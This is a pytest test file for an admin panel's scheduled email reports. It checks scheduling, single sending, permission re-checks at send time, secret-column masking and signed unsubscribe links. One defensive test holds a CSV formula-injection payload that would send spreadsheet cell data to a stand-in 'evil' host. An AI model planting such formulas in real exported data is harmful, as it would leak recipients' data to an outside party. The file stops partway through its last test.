"""Scheduled reports: who they run as, when they go, and what they must never send.

No test here sends mail anywhere: pytest-django swaps in the locmem backend, so
``mailoutbox`` is the whole outside world. Time is passed in (``run_due(now=...)``) or
frozen by patching the one clock the schedule reads, and the writes made through a view
announce themselves from ``on_commit``, which a pytest-django test never reaches, so the
tests that queue a send through a page run the callbacks themselves.

Three properties carry the feature, and the tests are named after the failure each
prevents:

**The export runs as the subscriber as they are *now*.** An inactive account, a lost
permission, a view that is no longer shared, a filter that has lost its field: all of
them are skipped with a reason in the log, and none of them sends a file.

**Running the cron command twice sends once.** A report is claimed before it is queued.

**The unsubscribe link needs no sign-in and can only pause the one subscription it names.**
"""

import csv
import datetime as dt
import io
import re
from zoneinfo import ZoneInfo

import pytest
from django.contrib.auth.models import Group, Permission, User
from django.core.management import call_command
from django.test import Client, override_settings
from django.urls import resolve, reverse
from django.utils import timezone

from tests.testapp.models import Author, Snippet, ZCredential
from vantage import jobs, reports
from vantage.models import ReportRun, ReportSubscription, SavedView
from vantage.sites import site

ORIGIN = "https://panel.example.com"
MY_REPORTS = "vantage:page-my-reports"
ALL_REPORTS = "vantage:page-reports"


# ── fixtures ────────────────────────────────────────────────────────────────


def grant(user, model, *actions):
    codenames = [f"{action}_{model._meta.model_name}" for action in actions]
    user.user_permissions.add(
        *Permission.objects.filter(
            content_type__app_label=model._meta.app_label, codename__in=codenames
        )
    )


def grant_vantage(user, codename):
    user.user_permissions.add(
        Permission.objects.get(content_type__app_label="vantage", codename=codename)
    )


@pytest.fixture
def ada(db):
    user = User.objects.create_user("ada", "ada@example.com", "x", is_staff=True)
    grant(user, Author, "view")
    return user


@pytest.fixture
def boss(db):
    return User.objects.create_superuser("boss", "boss@example.com", "x")


@pytest.fixture
def credential_columns():
    """Show the secret columns, which the inferred list leaves out, and put it back."""
    panel = site.get_panel(ZCredential)
    saved = dict(panel.__dict__)
    panel.list_display = ["name", "api_token", "card_number"]
    yield
    panel.__dict__.clear()
    panel.__dict__.update(saved)


@pytest.fixture
def authors(db):
    Author.objects.create(name="Ada Lovelace", email="al@example.com")
    Author.objects.create(name="Grace Hopper", email="gh@example.com")
    Author.objects.create(name="Adam Smith", email="as@example.com")


def make_view(owner, *, model="testapp.author", state=None, shared=False, name="Ada's"):
    return SavedView.objects.create(
        model_label=model,
        name=name,
        owner=owner,
        visibility="shared" if shared else "private",
        state=state if state is not None else {"version": 1, "filters": {}, "q": "ada"},
    )


def make_sub(user, view=None, **overrides):
    values = {
        "view": view or make_view(user),
        "user": user,
        "frequency": "daily",
        "send_time": dt.time(8, 0),
        "origin": ORIGIN,
        "next_run_at": timezone.now() - dt.timedelta(minutes=1),
    }
    values.update(overrides)
    return ReportSubscription.objects.create(**values)


def run_now(sub):
    """Queue a send the way the cron command does and run it, returning the log row."""
    run = ReportRun.objects.create(subscription=sub)
    return reports.run_report(run.pk)


def attached_rows(message):
    name, content, mimetype = message.attachments[0]
    assert mimetype == "text/csv"
    return name, list(
        csv.reader(io.StringIO(content if isinstance(content, str) else content.decode()))
    )


# ── the schedule ────────────────────────────────────────────────────────────

UTC = dt.UTC


def at(*args):
    return dt.datetime(*args, tzinfo=UTC)


class TestNextOccurrence:
    @pytest.fixture(autouse=True)
    def _utc(self, settings):
        # Django's default is America/Chicago; the arithmetic below is easier to read in UTC.
        settings.TIME_ZONE = "UTC"

    def test_daily_is_today_if_the_time_is_still_ahead(self):
        got = reports.next_occurrence("daily", dt.time(8, 0), after=at(2026, 3, 10, 7, 0))
        assert got == at(2026, 3, 10, 8, 0)

    def test_daily_moves_to_tomorrow_once_the_time_has_passed(self):
        got = reports.next_occurrence("daily", dt.time(8, 0), after=at(2026, 3, 10, 8, 0))
        assert got == at(2026, 3, 11, 8, 0)

    def test_weekly_finds_the_named_weekday(self):
        # 2026-03-10 is a Tuesday; Friday is weekday 4.
        got = reports.next_occurrence(
            "weekly", dt.time(9, 30), weekday=4, after=at(2026, 3, 10, 12, 0)
        )
        assert got == at(2026, 3, 13, 9, 30)

    def test_weekly_on_the_same_day_waits_a_week_once_the_time_has_gone(self):
        got = reports.next_occurrence(
            "weekly", dt.time(9, 0), weekday=1, after=at(2026, 3, 10, 9, 0)
        )
        assert got == at(2026, 3, 17, 9, 0)

    def test_monthly_uses_the_last_day_of_a_short_month(self):
        got = reports.next_occurrence(
            "monthly", dt.time(8, 0), day_of_month=31, after=at(2026, 2, 1, 0, 0)
        )
        assert got == at(2026, 2, 28, 8, 0)

    def test_monthly_rolls_over_the_year(self):
        got = reports.next_occurrence(
            "monthly", dt.time(8, 0), day_of_month=5, after=at(2026, 12, 20, 0, 0)
        )
        assert got == at(2027, 1, 5, 8, 0)

    @override_settings(TIME_ZONE="Asia/Tokyo")
    def test_the_time_is_read_in_the_site_timezone(self):
        # 08:00 in Tokyo is 23:00 UTC the day before.
        got = reports.next_occurrence("daily", dt.time(8, 0), after=at(2026, 3, 10, 0, 0))
        assert got.astimezone(ZoneInfo("Asia/Tokyo")).hour == 8
        assert got == at(2026, 3, 10, 23, 0)

    @override_settings(TIME_ZONE="Europe/London")
    def test_eight_oclock_stays_eight_oclock_across_the_clocks_going_forward(self):
        before = reports.next_occurrence("daily", dt.time(8, 0), after=at(2026, 3, 27, 12, 0))
        after = reports.next_occurrence("daily", dt.time(8, 0), after=at(2026, 3, 29, 12, 0))
        london = ZoneInfo("Europe/London")
        assert before.astimezone(london).hour == after.astimezone(london).hour == 8
        assert before.astimezone(UTC).hour == 8 and after.astimezone(UTC).hour == 7


# ── subscribing ─────────────────────────────────────────────────────────────


def subscribe(client, view, **overrides):
    data = {
        "view": view.pk,
        "frequency": "weekly",
        "weekday": "0",
        "day_of_month": "1",
        "send_time": "07:30",
        "to_self": "on",
        "next": "/admin/",
    }
    data.update(overrides)
    data = {key: value for key, value in data.items() if value is not None}
    return client.post(reverse("vantage:report-subscribe"), data)


class TestSubscribing:
    def test_a_subscription_is_scheduled_and_owned_by_the_subscriber(self, client, ada):
        client.force_login(ada)
        view = make_view(ada)

        response = subscribe(client, view)

        assert response.status_code == 302
        sub = ReportSubscription.objects.get()
        assert (sub.user, sub.view) == (ada, view)
        assert (sub.frequency, sub.weekday, sub.send_time) == ("weekly", 0, dt.time(7, 30))
        assert sub.next_run_at > timezone.now()
        assert sub.origin == "http://testserver"
        assert sub.active

    def test_fields_that_do_not_apply_to_the_frequency_are_dropped(self, client, ada):
        client.force_login(ada)
        subscribe(client, make_view(ada), frequency="daily", weekday="3", day_of_month="9")
        sub = ReportSubscription.objects.get()
        assert (sub.weekday, sub.day_of_month) == (None, None)

    def test_other_addresses_are_ignored_without_the_permission(self, client, ada):
        client.force_login(ada)
        subscribe(client, make_view(ada), recipients="boss@example.com")
        assert ReportSubscription.objects.get().recipients == []

    def test_other_addresses_are_kept_with_the_permission(self, client, ada):
        grant_vantage(ada, "send_reports_to_others")
        client.force_login(ada)
        subscribe(client, make_view(ada), recipients="a@example.com, B@example.com a@EXAMPLE.com")
        assert ReportSubscription.objects.get().recipients == ["a@example.com", "B@example.com"]

    def test_a_bad_address_schedules_nothing(self, client, ada):
        grant_vantage(ada, "send_reports_to_others")
        client.force_login(ada)
        subscribe(client, make_view(ada), recipients="not-an-address")
        assert not ReportSubscription.objects.exists()

    def test_you_cannot_subscribe_to_a_view_you_cannot_use(self, client, ada, boss):
        client.force_login(ada)
        private = make_view(boss, name="Boss only")
        assert subscribe(client, private).status_code == 404
        assert not ReportSubscription.objects.exists()

    def test_you_cannot_subscribe_to_a_model_you_cannot_view(self, client, ada):
        client.force_login(ada)
        view = make_view(ada, model="testapp.zcredential", state={"version": 1, "filters": {}})
        assert subscribe(client, view).status_code == 404

    def test_the_number_of_subscriptions_is_capped(self, client, ada):
        client.force_login(ada)
        view = make_view(ada)
        with override_settings(VANTAGE={"REPORTS_MAX_PER_USER": 1}):
            subscribe(client, view)
            subscribe(client, view, frequency="daily")
        assert ReportSubscription.objects.count() == 1

    def test_an_account_without_an_address_cannot_send_to_itself(self, client, db):
        user = User.objects.create_user("mute", "", "x", is_staff=True)
        grant(user, Author, "view")
        client.force_login(user)
        subscribe(client, make_view(user))
        assert not ReportSubscription.objects.exists()

    def test_the_list_page_offers_subscribe_on_a_saved_view_only(self, client, ada):
        client.force_login(ada)
        view = make_view(ada)
        plain = client.get(reverse("vantage:testapp-author-list")).content.decode()
        opened = client.get(reverse("vantage:testapp-author-list"), {"view": view.pk}, follow=True)
        assert "vantage:report-subscribe" not in plain and "_/reports/subscribe/" not in plain
        assert "_/reports/subscribe/" in opened.content.decode()

    def test_switched_off_there_is_no_control_and_no_route_to_use(self, client, ada):
        client.force_login(ada)
        view = make_view(ada)
        with override_settings(VANTAGE={"REPORTS": False}):
            opened = client.get(
                reverse("vantage:testapp-author-list"), {"view": view.pk}, follow=True
            )
            assert "_/reports/subscribe/" not in opened.content.decode()
            assert subscribe(client, view).status_code == 403
            assert client.get(reverse(MY_REPORTS)).status_code == 403


# ── finding what is due ─────────────────────────────────────────────────────


class TestRunDue:
    def test_a_due_report_is_sent_once_even_if_cron_runs_twice(
        self, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        sub = make_sub(ada)
        now = timezone.now()

        with django_capture_on_commit_callbacks(execute=True):
            first = reports.run_due(now=now)
            second = reports.run_due(now=now)

        assert (first, second) == (1, 0)
        assert len(mailoutbox) == 1
        assert ReportRun.objects.filter(subscription=sub).count() == 1

    def test_the_next_run_moves_forward_when_it_is_claimed(
        self, ada, django_capture_on_commit_callbacks
    ):
        sub = make_sub(ada, frequency="daily")
        now = timezone.now()
        with django_capture_on_commit_callbacks(execute=True):
            reports.run_due(now=now)
        sub.refresh_from_db()
        assert now < sub.next_run_at <= now + dt.timedelta(days=1)

    def test_a_week_of_downtime_sends_one_report_not_seven(
        self, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        make_sub(ada, next_run_at=timezone.now() - dt.timedelta(days=7))
        with django_capture_on_commit_callbacks(execute=True):
            reports.run_due(now=timezone.now())
            reports.run_due(now=timezone.now())
        assert len(mailoutbox) == 1

    def test_a_report_that_is_not_due_is_left_alone(self, ada, mailoutbox):
        make_sub(ada, next_run_at=timezone.now() + dt.timedelta(hours=1))
        assert reports.run_due() == 0
        assert not ReportRun.objects.exists() and not mailoutbox

    def test_a_paused_report_is_never_picked(self, ada, mailoutbox):
        make_sub(ada, active=False)
        assert reports.run_due() == 0

    def test_with_a_queue_the_command_queues_and_does_not_send(self, ada, monkeypatch, mailoutbox):
        handed = []
        monkeypatch.setattr(jobs, "detect_backend", lambda: jobs.Backend("rq", "RQ", True))
        monkeypatch.setattr(reports, "_submit", handed.append)
        make_sub(ada)

        with pytest.MonkeyPatch.context() as patch:
            patch.setattr("django.db.transaction.on_commit", lambda func: func())
            call_command("vantage_reports", "--no-sweep", stdout=io.StringIO())

        assert len(handed) == 1 and not mailoutbox
        assert ReportRun.objects.get().status == ReportRun.Status.PENDING

    def test_a_queued_send_nobody_picked_up_is_submitted_again(self, ada, monkeypatch):
        handed = []
        monkeypatch.setattr(reports, "_submit", handed.append)
        run = ReportRun.objects.create(subscription=make_sub(ada))
        ReportRun.objects.filter(pk=run.pk).update(
            created_at=timezone.now() - dt.timedelta(minutes=30)
        )
        assert reports.requeue_stale() == 1
        assert handed == [run.pk]

    def test_a_run_whose_worker_vanished_is_closed_as_failed(self, ada):
        run = ReportRun.objects.create(
            subscription=make_sub(ada),
            status=ReportRun.Status.RUNNING,
            started_at=timezone.now() - dt.timedelta(hours=3),
        )
        reports.requeue_stale()
        run.refresh_from_db()
        assert run.status == ReportRun.Status.FAILED and run.error

    def test_the_command_reports_what_it_did_and_tidies_the_log(
        self, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        make_sub(ada)
        old = ReportRun.objects.create(
            subscription=make_sub(ada, make_view(ada, name="Old"), next_run_at=None),
            status=ReportRun.Status.SENT,
        )
        ReportRun.objects.filter(pk=old.pk).update(
            created_at=timezone.now() - dt.timedelta(days=400)
        )
        out = io.StringIO()

        with django_capture_on_commit_callbacks(execute=True):
            call_command("vantage_reports", stdout=out)

        assert "Queued 1 due report." in out.getvalue()
        assert "Removed 1 old send log." in out.getvalue()
        assert len(mailoutbox) == 1

    def test_switched_off_the_command_does_nothing(self, ada, mailoutbox):
        make_sub(ada)
        with override_settings(VANTAGE={"REPORTS": False}):
            call_command("vantage_reports", stdout=io.StringIO())
        assert not ReportRun.objects.exists() and not mailoutbox


# ── what is sent ────────────────────────────────────────────────────────────


class TestTheEmail:
    def test_the_csv_is_attached_and_matches_the_saved_view(self, ada, authors, mailoutbox):
        run = run_now(make_sub(ada))

        assert run.status == ReportRun.Status.SENT
        assert (run.rows, run.attached, run.recipients_count) == (2, True, 1)
        message = mailoutbox[0]
        assert message.to == ["ada@example.com"]
        name, rows = attached_rows(message)
        assert name.endswith(".csv")
        assert {row[0] for row in rows[1:]} == {"Ada Lovelace", "Adam Smith"}
        assert "2 rows" in message.body

    def test_every_email_has_an_unsubscribe_link_and_header(self, ada, authors, mailoutbox):
        run_now(make_sub(ada))
        message = mailoutbox[0]
        link = re.search(rf"{ORIGIN}\S*/unsubscribe/\S+", message.body)
        assert link
        assert message.extra_headers["List-Unsubscribe"] == f"<{link.group(0)}>"
        assert message.extra_headers["List-Unsubscribe-Post"] == "List-Unsubscribe=One-Click"

    def test_sensitive_columns_go_out_masked(self, boss, mailoutbox, credential_columns):
        ZCredential.objects.create(name="Prod", api_token="sk_live_abcdef123456")
        view = make_view(
            boss, model="testapp.zcredential", state={"version": 1, "filters": {}}, name="Keys"
        )

        run = run_now(make_sub(boss, view))

        assert run.status == ReportRun.Status.SENT
        _name, rows = attached_rows(mailoutbox[0])
        flat = " ".join(" ".join(row) for row in rows)
        assert "Prod" in flat
        assert "sk_live_abcdef123456" not in flat
        assert "•" in flat

    def test_a_big_report_is_sent_as_a_note_without_the_file(self, ada, authors, mailoutbox):
        with override_settings(VANTAGE={"REPORTS_MAX_ATTACHMENT_MB": 0.00005}):
            run = run_now(make_sub(ada))

        assert run.status == ReportRun.Status.SENT
        assert (run.attached, run.size_bytes, run.rows) == (False, None, 2)
        message = mailoutbox[0]
        assert message.attachments == []
        assert "not attached" in message.body

    def test_each_recipient_gets_their_own_message(self, boss, authors, mailoutbox):
        view = make_view(boss)
        sub = make_sub(boss, view, recipients=["a@example.com", "b@example.com"])

        run = run_now(sub)

        assert run.recipients_count == 3
        assert sorted(m.to[0] for m in mailoutbox) == [
            "a@example.com",
            "b@example.com",
            "boss@example.com",
        ]
        assert all(len(m.to) == 1 for m in mailoutbox)

    def test_other_addresses_need_the_permission_at_send_time(self, ada, authors, mailoutbox):
        sub = make_sub(ada, recipients=["outside@example.com"])

        run = run_now(sub)

        assert [m.to for m in mailoutbox] == [["ada@example.com"]]
        assert "left out" in run.reason

    def test_a_report_to_others_only_does_not_need_an_address_of_its_own(
        self, ada, authors, mailoutbox
    ):
        grant_vantage(ada, "send_reports_to_others")
        run = run_now(make_sub(ada, to_self=False, recipients=["team@example.com"]))
        assert run.status == ReportRun.Status.SENT
        assert [m.to for m in mailoutbox] == [["team@example.com"]]

    def test_the_log_keeps_status_rows_and_timings(self, ada, authors):
        sub = make_sub(ada)
        run = run_now(sub)
        sub.refresh_from_db()
        assert run.status == "sent" and run.rows == 2
        assert run.started_at and run.finished_at and run.duration_ms is not None
        assert (sub.last_status, sub.last_run_at) == ("sent", run.finished_at)

    def test_a_mail_backend_that_refuses_is_recorded_as_a_failure(
        self, ada, authors, settings, mailoutbox
    ):
        settings.EMAIL_BACKEND = "tests.test_reports.BrokenBackend"
        run = run_now(make_sub(ada))
        assert run.status == ReportRun.Status.FAILED
        assert run.error

    def test_a_crash_in_the_export_is_a_failed_run_not_a_dead_worker(
        self, ada, authors, monkeypatch, mailoutbox
    ):
        def boom(*args, **kwargs):
            raise RuntimeError("database went away")

        monkeypatch.setattr(reports, "_csv_bytes", boom)
        run = run_now(make_sub(ada))
        assert run.status == ReportRun.Status.FAILED
        assert "database went away" in run.error
        assert not mailoutbox

    def test_a_run_is_claimed_once_whoever_asks(self, ada, authors, mailoutbox):
        run = ReportRun.objects.create(subscription=make_sub(ada))
        reports.run_report(run.pk)
        reports.run_report(run.pk)
        assert len(mailoutbox) == 1


from django.core.mail.backends.base import BaseEmailBackend  # noqa: E402


class BrokenBackend(BaseEmailBackend):
    def send_messages(self, email_messages):
        raise OSError("connection refused")


# ── whose permissions ───────────────────────────────────────────────────────


class TestRunsAsTheSubscriberNow:
    def assert_skipped(self, run, mailoutbox, *words):
        assert run.status == ReportRun.Status.SKIPPED
        assert all(word in run.reason for word in words), run.reason
        assert not mailoutbox
        assert run.rows is None

    def test_an_inactive_account_is_skipped(self, ada, authors, mailoutbox):
        sub = make_sub(ada)
        User.objects.filter(pk=ada.pk).update(is_active=False)
        self.assert_skipped(run_now(sub), mailoutbox, "inactive")

    def test_an_account_that_lost_the_panel_is_skipped(self, ada, authors, mailoutbox):
        sub = make_sub(ada)
        User.objects.filter(pk=ada.pk).update(is_staff=False)
        self.assert_skipped(run_now(sub), mailoutbox, "sign in")

    def test_a_revoked_view_permission_stops_the_report(self, ada, authors, mailoutbox):
        sub = make_sub(ada)
        assert run_now(sub).status == ReportRun.Status.SENT
        ada.user_permissions.clear()
        mailoutbox.clear()

        self.assert_skipped(run_now(sub), mailoutbox, "may no longer view")

    def test_permissions_at_subscribe_time_are_not_remembered(self, ada, authors, mailoutbox):
        # Subscribed while holding the permission; the sub row stores none of it, so
        # nothing can still be vouching for access that has since been taken away.
        sub = make_sub(ada)
        assert not any("perm" in f.name for f in ReportSubscription._meta.get_fields())
        ada.user_permissions.clear()
        self.assert_skipped(run_now(sub), mailoutbox, "may no longer view")

    def test_a_view_that_is_no_longer_shared_with_them_is_skipped(
        self, ada, boss, authors, mailoutbox
    ):
        view = make_view(boss, shared=True)
        sub = make_sub(ada, view)
        assert run_now(sub).status == ReportRun.Status.SENT
        SavedView.objects.filter(pk=view.pk).update(visibility="private")
        mailoutbox.clear()

        self.assert_skipped(run_now(sub), mailoutbox, "no longer shared")

    def test_a_filter_that_lost_its_field_is_skipped_rather_than_widened(
        self, ada, authors, mailoutbox
    ):
        view = make_view(ada, state={"version": 1, "filters": {"gone_field": ["x"]}, "q": "ada"})
        self.assert_skipped(run_now(make_sub(ada, view)), mailoutbox, "no longer applies")

    def test_a_model_that_is_no_longer_registered_is_skipped(self, ada, mailoutbox):
        view = make_view(ada, model="testapp.nothing", state={"version": 1, "filters": {}})
        self.assert_skipped(run_now(make_sub(ada, view)), mailoutbox, "No panel")

    def test_nobody_to_send_to_is_skipped(self, ada, authors, mailoutbox):
        User.objects.filter(pk=ada.pk).update(email="")
        self.assert_skipped(run_now(make_sub(ada)), mailoutbox, "nobody")

    def test_a_report_with_no_address_to_link_from_is_skipped(self, ada, authors, mailoutbox):
        # Never send an email without a working unsubscribe link.
        self.assert_skipped(run_now(make_sub(ada, origin="")), mailoutbox, "unsubscribe")

    def test_the_base_url_setting_overrides_the_stored_origin(self, ada, authors, mailoutbox):
        with override_settings(VANTAGE={"REPORTS_BASE_URL": "https://reports.example.org/"}):
            run_now(make_sub(ada))
        assert "https://reports.example.org/" in mailoutbox[0].body
        assert ORIGIN not in mailoutbox[0].body

    def test_rows_outside_the_subscribers_scope_are_not_sent(self, db, mailoutbox):
        alice = User.objects.create_user("alice", "alice@example.com", "x", is_staff=True)
        bob = User.objects.create_user("bob", "bob@example.com", "x", is_staff=True)
        for user in (alice, bob):
            grant(user, Snippet, "view")
        Snippet.objects.create(title="Alice's plan", owner=alice)
        Snippet.objects.create(title="Bob's plan", owner=bob)
        view = make_view(alice, model="testapp.snippet", state={"version": 1, "filters": {}})
        sub = make_sub(alice, view, tenant=str(alice.pk))

        with override_settings(
            VANTAGE={"TENANT_MODEL": "auth.User", "TENANT_FIELD": "pk"},
            MIDDLEWARE=[
                "django.contrib.sessions.middleware.SessionMiddleware",
                "django.contrib.auth.middleware.AuthenticationMiddleware",
                "vantage.tenancy.TenantMiddleware",
            ],
        ):
            run = run_now(sub)

        assert run.status == ReportRun.Status.SENT and run.rows == 1
        _name, rows = attached_rows(mailoutbox[0])
        assert [row[0] for row in rows[1:]] == ["Alice's plan"]

    def test_a_changed_tenant_skips_the_report(self, db, mailoutbox):
        alice = User.objects.create_user("alice", "alice@example.com", "x", is_staff=True)
        grant(alice, Snippet, "view")
        view = make_view(alice, model="testapp.snippet", state={"version": 1, "filters": {}})
        sub = make_sub(alice, view, tenant="99999")

        with override_settings(
            VANTAGE={"TENANT_MODEL": "auth.User", "TENANT_FIELD": "pk"},
            MIDDLEWARE=[
                "django.contrib.sessions.middleware.SessionMiddleware",
                "django.contrib.auth.middleware.AuthenticationMiddleware",
                "vantage.tenancy.TenantMiddleware",
            ],
        ):
            run = run_now(sub)

        assert run.status == ReportRun.Status.SKIPPED and "tenant" in run.reason
        assert not mailoutbox


# ── unsubscribing ───────────────────────────────────────────────────────────


def unsubscribe_path(sub):
    return reverse("vantage:report-unsubscribe", args=[reports.unsubscribe_token(sub)])


class TestUnsubscribe:
    def test_opening_the_link_changes_nothing(self, ada):
        sub = make_sub(ada)
        response = Client().get(unsubscribe_path(sub))
        assert response.status_code == 200
        sub.refresh_from_db()
        assert sub.active and sub.next_run_at

    def test_posting_pauses_it_without_signing_in(self, ada):
        sub = make_sub(ada)
        response = Client().post(unsubscribe_path(sub))
        assert response.status_code == 200
        sub.refresh_from_db()
        assert not sub.active and sub.next_run_at is None
        assert "unsubscribe link" in sub.paused_reason

    def test_the_link_from_a_real_email_works(self, ada, authors, mailoutbox):
        sub = make_sub(ada)
        run_now(sub)
        path = re.search(rf"{ORIGIN}(\S*/unsubscribe/\S+)", mailoutbox[0].body).group(1)
        Client().post(path)
        sub.refresh_from_db()
        assert not sub.active

    def test_it_pauses_only_the_subscription_it_names(self, ada, boss):
        mine = make_sub(ada)
        other = make_sub(boss, make_view(boss, name="Other"))
        Client().post(unsubscribe_path(mine))
        other.refresh_from_db()
        assert other.active

    def test_a_forged_token_is_refused(self, ada):
        sub = make_sub(ada)
        token = reports.unsubscribe_token(sub)
        forged = token[:-3] + ("aaa" if not token.endswith("aaa") else "bbb")
        response = Client().post(reverse("vantage:report-unsubscribe", args=[forged]))
        assert response.status_code == 404
        sub.refresh_from_db()
        assert sub.active

    def test_a_token_minted_for_anything_else_is_refused(self, ada):
        from django.core import signing

        sub = make_sub(ada)
        other_salt = signing.dumps({"report": sub.pk}, salt="something.else")
        response = Client().post(reverse("vantage:report-unsubscribe", args=[other_salt]))
        assert response.status_code == 404
        sub.refresh_from_db()
        assert sub.active

    def test_a_deleted_subscription_says_so(self, ada):
        sub = make_sub(ada)
        path = unsubscribe_path(sub)
        sub.delete()
        assert Client().get(path).status_code == 404

    def test_it_works_when_reports_are_switched_off(self, ada):
        sub = make_sub(ada)
        with override_settings(VANTAGE={"REPORTS": False}):
            Client().post(unsubscribe_path(sub))
        sub.refresh_from_db()
        assert not sub.active

    def test_a_pending_second_sign_in_step_does_not_block_it(self, ada):
        from vantage import twofactor

        match = resolve(reverse("vantage:report-unsubscribe", args=["x"]))
        assert twofactor.VERIFY in twofactor._allows(match.func, match.url_name)


# ── the pages ───────────────────────────────────────────────────────────────


class TestPages:
    def test_my_reports_lists_only_my_own(self, client, ada, boss, authors):
        make_sub(ada, make_view(ada, name="Mine"))
        make_sub(boss, make_view(boss, name="Not yours"))
        client.force_login(ada)

        page = client.get(reverse(MY_REPORTS)).content.decode()

        assert "Mine" in page and "Not yours" not in page

    def test_the_system_page_is_for_managers(self, client, ada, boss):
        make_sub(ada, make_view(ada, name="Ada's weekly"))
        client.force_login(ada)
        assert client.get(reverse(ALL_REPORTS)).status_code == 403

        client.force_login(boss)
        assert "Ada&#x27;s weekly" in client.get(reverse(ALL_REPORTS)).content.decode()

    def test_the_permission_makes_a_manager(self, client, ada):
        grant_vantage(ada, "manage_reports")
        client.force_login(ada)
        assert client.get(reverse(ALL_REPORTS)).status_code == 200

    def test_pause_and_resume(self, client, ada):
        sub = make_sub(ada)
        client.force_login(ada)

        client.post(reverse("vantage:report-pause", args=[sub.pk]))
        sub.refresh_from_db()
        assert not sub.active and sub.next_run_at is None

        client.post(reverse("vantage:report-resume", args=[sub.pk]))
        sub.refresh_from_db()
        assert sub.active and sub.next_run_at > timezone.now()

    def test_delete_asks_first_and_takes_the_log_with_it(self, client, ada):
        sub = make_sub(ada)
        ReportRun.objects.create(subscription=sub)
        client.force_login(ada)
        url = reverse("vantage:report-delete", args=[sub.pk])

        assert client.get(url).status_code == 200
        assert ReportSubscription.objects.exists()
        client.post(url)

        assert not ReportSubscription.objects.exists() and not ReportRun.objects.exists()

    def test_send_now_sends_once_and_leaves_the_schedule_alone(
        self, client, ada, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        sub = make_sub(ada, next_run_at=timezone.now() + dt.timedelta(days=3))
        before = sub.next_run_at
        client.force_login(ada)

        with django_capture_on_commit_callbacks(execute=True):
            client.post(reverse("vantage:report-send", args=[sub.pk]))

        assert len(mailoutbox) == 1
        run = ReportRun.objects.get()
        assert run.trigger == ReportRun.Trigger.MANUAL and run.status == ReportRun.Status.SENT
        sub.refresh_from_db()
        assert sub.next_run_at == before

    def test_a_manager_can_pause_and_send_anyones(
        self, client, ada, boss, authors, mailoutbox, django_capture_on_commit_callbacks
    ):
        sub = make_sub(ada)
        client.force_login(boss)

        with django_capture_on_commit_callbacks(execute=True):
            client.post(reverse("vantage:report-send", args=[sub.pk]))
        client.post(reverse("vantage:report-pause", args=[sub.pk]))

        # Sent as the subscriber, to the subscriber's address, not the manager's.
        assert [m.to for m in mailoutbox] == [["ada@example.com"]]
        sub.refresh_from_db()
        assert not sub.active

    def test_a_manager_cannot_change_where_someone_elses_report_goes(self, client, ada, boss):
        sub = make_sub(ada)
        client.force_login(boss)
        assert client.get(reverse("vantage:report-edit", args=[sub.pk])).status_code == 404

    def test_someone_else_s_subscription_does_not_exist_to_you(self, client, ada, boss):
        sub = make_sub(boss, make_view(boss, name="Boss"))
        client.force_login(ada)
        for action in ("pause", "resume", "send", "delete"):
            response = client.post(reverse(f"vantage:report-{action}", args=[sub.pk]))
            assert response.status_code == 404, action
        assert client.get(reverse("vantage:report-delete", args=[sub.pk])).status_code == 404
        sub.refresh_from_db()
        assert sub.active

    def test_editing_reschedules(self, client, ada):
        sub = make_sub(ada, frequency="daily")
        client.force_login(ada)

        client.post(
            reverse("vantage:report-edit", args=[sub.pk]),
            {"frequency": "monthly", "day_of_month": "15", "send_time": "06:00", "to_self": "on"},
        )

        sub.refresh_from_db()
        assert (sub.frequency, sub.day_of_month, sub.send_time) == ("monthly", 15, dt.time(6, 0))
        assert sub.next_run_at.astimezone(timezone.get_default_timezone()).day == 15

    def test_the_log_page_shows_why_a_send_was_skipped(self, client, ada):
        sub = make_sub(ada)
        User.objects.filter(pk=ada.pk).update(is_staff=True)
        ReportRun.objects.create(
            subscription=sub,
            status=ReportRun.Status.SKIPPED,
            reason="Ada may no longer view authors.",
        )
        client.force_login(ada)
        assert "may no longer view authors" in client.get(reverse(MY_REPORTS)).content.decode()

    def test_the_audit_trail_records_what_was_subscribed_to(self, client, ada):
        from vantage.models import VantageLogEntry

        client.force_login(ada)
        subscribe(client, make_view(ada))
        entry = VantageLogEntry.objects.get(action="create")
        assert entry.changes == {"view": {"to": "Ada's"}}


# ── checks ──────────────────────────────────────────────────────────────────


class TestChecks:
    def ids(self, **vantage):
        from vantage.checks import check_vantage_settings

        with override_settings(VANTAGE=vantage):
            return [e.id for e in check_vantage_settings(None)]

    def test_defaults_are_clean(self):
        assert self.ids() == []

    def test_reports_must_be_a_bool(self):
        assert self.ids(REPORTS="yes") == ["vantage.E115"]

    @pytest.mark.parametrize(
        "key", ["REPORTS_MAX_ATTACHMENT_MB", "REPORTS_MAX_PER_USER", "REPORTS_RETENTION_DAYS"]
    )
    @pytest.mark.parametrize("value", [0, -1, "10", True])
    def test_limits_must_be_positive_numbers(self, key, value):
        assert self.ids(**{key: value}) == ["vantage.E116"]

    @pytest.mark.parametrize("value", ["panel.example.com", 5])
    def test_base_url_needs_a_scheme(self, value):
        assert self.ids(REPORTS_BASE_URL=value) == ["vantage.E117"]

    def test_empty_and_full_base_urls_pass(self):
        assert self.ids(REPORTS_BASE_URL="") == []
        assert self.ids(REPORTS_BASE_URL="https://panel.example.com") == []


class TestAttachmentFormulaInjection:
    def test_a_formula_in_the_data_is_quoted_in_the_attachment(self, ada, mailoutbox):
        evil = '=HYPERLINK("http://evil/?"&A1,"x")'
        Author.objects.create(name=evil, email="e@example.com")
        view = make_view(ada, state={"version": 1, "filters": {}, "q": "HYPERLINK"})
        run_now(make_sub(ada, view))
        _, rows = attached_rows(mailoutbox[0])
        assert "'" + evil in [cell for row in rows for cell in row]
        assert evil not in [cell for row in rows for cell in row]


class TestSendTimeRechecks:
    """Things that changed between queueing a send and running it."""

    def test_a_scheduled_run_queued_before_a_pause_is_skipped(self, ada, authors, mailoutbox):
        sub = make_sub(ada)
        run = ReportRun.objects.create(subscription=sub)
        ReportSubscription.objects.filter(pk=sub.pk).update(active=False)
        run = reports.run_report(run.pk)
        assert run.status == ReportRun.Status.SKIPPED
        assert "paused" in run.reason
        assert not mailoutbox

    def test_send_now_still_sends_a_paused_report(self, ada, authors, mailoutbox):
        sub = make_sub(ada, active=False)
        run = ReportRun.objects.create(subscription=sub, trigger=ReportRun.Trigger.MANUAL)
        assert reports.run_report(run.pk).status == ReportRun.Status.SENT
        assert len(mailoutbox) == 1

    def test_an_owner_who_must_use_two_factor_and_has_not_is_skipped(
        self, ada, authors, mailoutbox, settings
